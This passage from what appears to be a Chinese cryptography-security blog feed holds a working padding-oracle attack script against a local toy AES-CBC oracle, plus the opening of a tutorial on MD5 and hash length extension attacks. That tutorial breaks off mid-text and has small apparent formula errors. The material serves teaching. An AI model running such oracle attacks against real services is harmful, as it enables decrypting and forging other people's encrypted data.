text<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""PKCS7 padding"""</span>        text_length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span>        amount_to_pad <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size <span class="token operator">-</span> <span class="token punctuation">(</span>text_length <span class="token operator">%</span> AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span>        <span class="token keyword">if</span> amount_to_pad <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            amount_to_pad <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size        pad <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>amount_to_pad<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> text <span class="token operator">+</span> pad <span class="token operator">*</span> amount_to_pad    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">__unpad</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> text<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        pad <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        _pad <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token operator">-</span>pad<span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> _pad<span class="token punctuation">:</span>            <span class="token keyword">if</span> pad <span class="token operator">!=</span> i<span class="token punctuation">:</span>                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Error Padding! - %s"</span> <span class="token operator">%</span> _pad<span class="token punctuation">)</span>        <span class="token keyword">return</span> text<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span>pad<span class="token punctuation">]</span>    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> plain<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        pad_plain <span class="token operator">=</span> cls<span class="token punctuation">.</span>__pad<span class="token punctuation">(</span>plain<span class="token punctuation">)</span>        aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>mode<span class="token operator">=</span>AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> key<span class="token operator">=</span>cls<span class="token punctuation">.</span>KEY<span class="token punctuation">,</span> iv<span class="token operator">=</span>cls<span class="token punctuation">.</span>IV<span class="token punctuation">)</span>        cipher <span class="token operator">=</span> aes<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>pad_plain<span class="token punctuation">)</span>        hexdump<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>        <span class="token keyword">return</span> cipher    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> cipher<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>mode<span class="token operator">=</span>AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> key<span class="token operator">=</span>cls<span class="token punctuation">.</span>KEY<span class="token punctuation">,</span> iv<span class="token operator">=</span>cls<span class="token punctuation">.</span>IV<span class="token punctuation">)</span>        pad_plain <span class="token operator">=</span> aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>        <span class="token keyword">return</span> cls<span class="token punctuation">.</span>__unpad<span class="token punctuation">(</span>pad_plain<span class="token punctuation">)</span>    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">decrypt_without_result</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> cipher<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            cls<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token comment"># print(e)</span>            <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> POA<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>plain<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    cipher <span class="token operator">=</span> test<span class="token punctuation">(</span><span class="token punctuation">)</span>    plain <span class="token operator">=</span> POA<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>plain<span class="token punctuation">)</span>    IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-2-poa-attack-py"><a href="#3-2-poa-attack-py" class="headerlink" title="3.2 poa_attack.py"></a>3.2 poa_attack.py</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> pdb<span class="token keyword">from</span> poa <span class="token keyword">import</span> test<span class="token punctuation">,</span> POA<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">import</span> IPython<span class="token keyword">class</span> <span class="token class-name">PaddingOracleAttack</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> cipher<span class="token punctuation">,</span> iv<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>cipher <span class="token operator">=</span> cipher        <span class="token comment"># 把密文分割成列表，每个列表元素16字节</span>        self<span class="token punctuation">.</span>cipher_lst <span class="token operator">=</span> self<span class="token punctuation">.</span>split_block<span class="token punctuation">(</span>self<span class="token punctuation">.</span>cipher<span class="token punctuation">)</span>        <span class="token comment"># 解密的中间值</span>        self<span class="token punctuation">.</span>mid_lst <span class="token operator">=</span> <span class="token punctuation">[</span>self<span class="token punctuation">.</span>brute_middle<span class="token punctuation">(</span>self<span class="token punctuation">.</span>cipher_lst<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token comment"># 存储计算出来的明文</span>        self<span class="token punctuation">.</span>plain_lst <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> self<span class="token punctuation">.</span>cipher_lst<span class="token punctuation">]</span>    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">split_block</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> cipher<span class="token punctuation">)</span><span class="token punctuation">:</span>        cipher_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            cipher_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>cipher<span class="token punctuation">[</span>i<span class="token punctuation">:</span> i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> cipher_list    <span class="token keyword">def</span> <span class="token function">calc_new_tail</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> tail<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">:</span>        new_tail <span class="token operator">=</span> <span class="token string">b""</span>        <span class="token keyword">for</span> t <span class="token keyword">in</span> tail<span class="token punctuation">:</span>            _tail <span class="token operator">=</span> t <span class="token operator">^</span> <span class="token punctuation">(</span>idx <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> idx            new_tail <span class="token operator">+=</span> _tail<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">"big"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> new_tail    <span class="token keyword">def</span> <span class="token function">brute_middle</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> cipher_line<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''暴力破解解密的中间值'''</span>        tail <span class="token operator">=</span> <span class="token string">b""</span>        mid_lst <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token comment"># 从pad 为0x01开始 到 0x10</span>        <span class="token keyword">for</span> pad <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># 计算新的pad尾部，因为每计算出来一个pad，再往前计算新的pad的时候，尾部的每一个值异或出来都要放大1位。</span>            tail <span class="token operator">=</span> self<span class="token punctuation">.</span>calc_new_tail<span class="token punctuation">(</span>tail<span class="token punctuation">,</span> pad<span class="token punctuation">)</span>            find_pad <span class="token operator">=</span> <span class="token boolean">False</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token comment"># 形成2个密文块</span>                cipher <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">-</span> pad<span class="token punctuation">)</span> <span class="token operator">+</span> i<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">"big"</span><span class="token punctuation">)</span> <span class="token operator">+</span> tail <span class="token operator">+</span> cipher_line                <span class="token keyword">if</span> POA<span class="token punctuation">.</span>decrypt_without_result<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token comment"># print("[!] Cipher - %s" % cipher)</span>                    find_pad <span class="token operator">=</span> <span class="token boolean">True</span>                    tail <span class="token operator">=</span> i<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">"big"</span><span class="token punctuation">)</span> <span class="token operator">+</span> tail                    mid_chr <span class="token operator">=</span> i <span class="token operator">^</span> pad                    mid_lst<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> mid_chr<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> find_pad<span class="token punctuation">:</span>                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Error not find pad!"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>mid_lst<span class="token punctuation">)</span>    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">__pad</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> text<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""PKCS7 padding"""</span>        text_length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span>        amount_to_pad <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size <span class="token operator">-</span> <span class="token punctuation">(</span>text_length <span class="token operator">%</span> AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span>        <span class="token keyword">if</span> amount_to_pad <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            amount_to_pad <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size        pad <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>amount_to_pad<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> text <span class="token operator">+</span> pad <span class="token operator">*</span> amount_to_pad    <span class="token keyword">def</span> <span class="token function">fake</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> plain<span class="token punctuation">,</span> cipher<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> mid<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''伪造        :plain: 要伪造的明文        :last_cipher: 一个密文块        :last_mid:  密文块解密出来的中间值        '''</span>        pad_plain <span class="token operator">=</span> self<span class="token punctuation">.</span>__pad<span class="token punctuation">(</span>plain<span class="token punctuation">)</span>        plain_lst <span class="token operator">=</span> self<span class="token punctuation">.</span>split_block<span class="token punctuation">(</span>pad_plain<span class="token punctuation">)</span>        mid <span class="token operator">=</span> mid <span class="token keyword">if</span> mid <span class="token keyword">else</span> self<span class="token punctuation">.</span>mid_lst<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        cipher <span class="token operator">=</span> <span class="token punctuation">[</span>cipher <span class="token keyword">if</span> cipher <span class="token keyword">else</span> self<span class="token punctuation">.</span>cipher_lst<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token comment"># 从最后开始计算</span>        <span class="token keyword">for</span> plain <span class="token keyword">in</span> plain_lst<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            need_iv <span class="token operator">=</span> <span class="token string">b""</span>            <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>plain<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                _m <span class="token operator">=</span> mid<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>                _p <span class="token operator">=</span> plain<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>                need_iv <span class="token operator">+=</span> <span class="token punctuation">(</span>_m <span class="token operator">^</span> _p<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">"big"</span><span class="token punctuation">)</span>            mid <span class="token operator">=</span> self<span class="token punctuation">.</span>brute_middle<span class="token punctuation">(</span>need_iv<span class="token punctuation">)</span>            cipher<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> need_iv<span class="token punctuation">)</span>        <span class="token keyword">return</span> cipher<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>cipher<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''解密'''</span>        <span class="token comment"># 从最后开始计算</span>        self<span class="token punctuation">.</span>mid_lst <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> _idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>cipher_lst<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            line_idx <span class="token operator">=</span> _idx <span class="token operator">-</span> <span class="token number">1</span>            cipher_line <span class="token operator">=</span> self<span class="token punctuation">.</span>cipher_lst<span class="token punctuation">[</span>line_idx<span class="token punctuation">]</span>            <span class="token keyword">if</span> line_idx <span class="token operator">&gt;=</span> <span class="token number">1</span><span class="token punctuation">:</span>                <span class="token comment"># 获取上一行密文数据，因为每一行的明文加密之前需要与上一行的密文异或</span>                p_cipher_line <span class="token operator">=</span> self<span class="token punctuation">.</span>cipher_lst<span class="token punctuation">[</span>line_idx <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token comment"># 如果是第一行，则其与IV异或</span>                p_cipher_line <span class="token operator">=</span> iv            _mid <span class="token operator">=</span> self<span class="token punctuation">.</span>brute_middle<span class="token punctuation">(</span>cipher_line<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>mid_lst<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> _mid<span class="token punctuation">)</span>            <span class="token keyword">for</span> idx<span class="token punctuation">,</span> _m <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>_mid<span class="token punctuation">)</span><span class="token punctuation">:</span>                plain_chr <span class="token operator">=</span> _m <span class="token operator">^</span> p_cipher_line<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>                self<span class="token punctuation">.</span>plain_lst<span class="token punctuation">[</span>line_idx<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>plain_chr<span class="token punctuation">)</span>        plain <span class="token operator">=</span> <span class="token string">b""</span>        <span class="token keyword">for</span> p <span class="token keyword">in</span> self<span class="token punctuation">.</span>plain_lst<span class="token punctuation">:</span>            plain <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>        <span class="token keyword">return</span> plain<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    cipher <span class="token operator">=</span> test<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment"># 获取密文</span>    iv <span class="token operator">=</span> POA<span class="token punctuation">.</span>IV         <span class="token comment"># 获取初始化向量</span>    poa_atck <span class="token operator">=</span> PaddingOracleAttack<span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>    new_iv<span class="token punctuation">,</span> new_cipher <span class="token operator">=</span> poa_atck<span class="token punctuation">.</span>fake<span class="token punctuation">(</span><span class="token string">b"wo ai beijing tianan men!"</span><span class="token punctuation">)</span>    plain <span class="token operator">=</span> poa_atck<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span><span class="token punctuation">)</span>    IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 密码学算法安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> padding oracle攻击 </tag>
            
            <tag> web安全中的密码学攻击 </tag>
            
            <tag> 密码学算法安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哈希长度扩展攻击</title>
      <link href="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/"/>
      <url>/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="一、MD5哈希算法"><a href="#一、MD5哈希算法" class="headerlink" title="一、MD5哈希算法"></a>一、MD5哈希算法</h1><h2 id="1-1-MD5简介"><a href="#1-1-MD5简介" class="headerlink" title="1.1 MD5简介"></a>1.1 MD5简介</h2><p>MD5（Message Digest Algorithm 5）是一种广泛使用的加密散列函数，它可以产生一个128位（16字节）的散列值（hash value），通常用一个32位的十六进制字符串表示，且具有不可逆性（即理论上从散列值无法推导出明文）。MD5由Ron Rivest在1991年设计，最初被用来作为一种安全的密码散列算法。它接收任意长度的输入，并产生一个固定长度的输出，这个输出被认为是输入数据的“指纹”。然而，由于后来发现MD5存在安全漏洞，它不再被推荐用于密码存储等安全敏感的应用。尽管如此，MD5仍然被用于一些非安全相关的场合，比如文件完整性检查。</p><h3 id="1-1-1-php-中md5函数的用法示例"><a href="#1-1-1-php-中md5函数的用法示例" class="headerlink" title="1.1.1 php 中md5函数的用法示例"></a>1.1.1 php 中md5函数的用法示例</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test string"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">=</span> php5.6 index.php6f8db599de986fab7a21625b7916589c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="1-1-2-哈希函数与加密函数的区别"><a href="#1-1-2-哈希函数与加密函数的区别" class="headerlink" title="1.1.2 哈希函数与加密函数的区别"></a>1.1.2 哈希函数与加密函数的区别</h3><p>哈希将目标转换为具有相同长度的、不可逆的杂凑字符串；</p><p>加密则是将目标转化为不同长度的、可逆的密文，长度一般随明文增长而增加；</p><h3 id="1-1-3-常见的哈希算法介绍"><a href="#1-1-3-常见的哈希算法介绍" class="headerlink" title="1.1.3 常见的哈希算法介绍"></a>1.1.3 常见的哈希算法介绍</h3><p>当前最常用的哈希算法有<code>MD5</code>、<code>SHA-1</code>、<code>SHA-2（SHA-224、SHA-256、SHA-384，和SHA-512并称为SHA-2）</code>等。</p><h2 id="1-2-md5哈希算法流程详解"><a href="#1-2-md5哈希算法流程详解" class="headerlink" title="1.2 md5哈希算法流程详解"></a>1.2 md5哈希算法流程详解</h2><h3 id="1-2-0-步骤概览"><a href="#1-2-0-步骤概览" class="headerlink" title="1.2.0 步骤概览"></a>1.2.0 步骤概览</h3><p>MD5算法的详细流程可以概括为以下几个步骤：</p><p>1）明文填充</p><p>2）初始化变量</p><p>3）分块处理</p><p>4）循环压缩函数处理</p><p>5）更新寄存器</p><p>6）生成哈希值</p><p>具体的数据处理流程如图所示：</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.36.49.png" alt="算法数据处理流程概览" style="zoom:80%;"><h3 id="1-2-1-明文填充"><a href="#1-2-1-明文填充" class="headerlink" title="1.2.1 明文填充"></a>1.2.1 明文填充</h3><p>MD5以512bit为分块处理输入信息，每个分块又被分为16*32的子分组，最终输出为4*32的分组，即32为字符串。</p><ul><li>填充</li></ul><p>输入信息的长度(bit)对512求余不等于448时，使用OneAndZeroes对输入信息进行填充使得对512求余448。</p><p>假设对”abc”进行MD5计算，填充步骤：</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.32.09.png" alt="明文填充示意图" style="zoom:50%;"><ul><li>记录信息长度</li></ul><p>填充完成后，用64bit存储信息的长度，”abc”共有24bit，即0x18bit，记录的消息长度为：</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.33.18.png" alt="长度记录" style="zoom:50%;"><h3 id="1-2-2-初始化变量"><a href="#1-2-2-初始化变量" class="headerlink" title="1.2.2 初始化变量"></a>1.2.2 初始化变量</h3><p>MD5的哈希结果长度为128位，按每32位分成一组共4组。这4组结果是由4个初始值A、B、C、D经过不断演变得到。算法初始化四个32位的寄存器A、B、C、D，这些寄存器同时用于存储中间计算结果</p><p>MD5的官方实现中，A、B、C、D的初始值如下（16进制）：</p><p>A=0x01234567</p><p>B=0x89ABCDEF</p><p>C=0xFEDCBA98</p><p>D=0x76543210</p><h3 id="1-2-3-分块处理"><a href="#1-2-3-分块处理" class="headerlink" title="1.2.3 分块处理"></a>1.2.3 分块处理</h3><p>将填充后的数据按照512位（64字节）一块进行处理，每块包含16个32位字。</p><h3 id="1-2-4-循环压缩函数处理"><a href="#1-2-4-循环压缩函数处理" class="headerlink" title="1.2.4 循环压缩函数处理"></a>1.2.4 循环压缩函数处理</h3><p>对每个512位的数据块进行四轮循环压缩函数处理，每轮处理包括四个步骤：F函数、G函数、H函数和I函数。这些非线性函数在循环压缩函数处理中起着重要作用。</p><p>主要流程是以512位的分块为单位，每一分块经过4轮循环，每轮循环16次迭代，输出128位的结果，存放在缓冲区中，作为下一轮循环缓冲区的输入。</p><p>4轮循环的逻辑如图所示：</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.42.19.png" alt="512bit的数据处理流程" style="zoom:50%;"><p>从缓冲区输入128位，从消息分组输入512位，输出结果128位，要注意结果是由循环的结果加上缓冲区的值得到的(加法为模$2^32$加法)。A，B，C，D就是哈希值的四个分组。每一次循环都会让旧的ABCD产生新的ABCD。一共进行多少次循环呢？由原文长度决定。假设处理后的原文长度是M，主循环次数 = M / 512，每个主循环中包含 （512/32） * 4 = 64 次子循环。上面这张图所表达的是单次子循环的流程。</p><p>每轮循环中单次迭代的逻辑如图所示：</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.59.48.png" alt="单轮循环中的单次迭代逻辑" style="zoom:50%;"><p>每轮循环迭代运算的逻辑：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>对A迭代：a <span class="token operator">&lt;</span>—— <span class="token number">6</span>+<span class="token punctuation">((</span>a+g<span class="token punctuation">(</span>b,c,d<span class="token punctuation">)</span>+X<span class="token punctuation">[</span>k<span class="token punctuation">]</span>+T<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;&lt;</span>s<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>缓冲区（A,B,C,D<span class="token punctuation">)</span>作循环轮换：<span class="token punctuation">(</span>B,C,D,A<span class="token punctuation">)</span> <span class="token operator">&lt;</span>——<span class="token punctuation">(</span>A,B,C,D<span class="token punctuation">)</span><span aria-hidden="true" 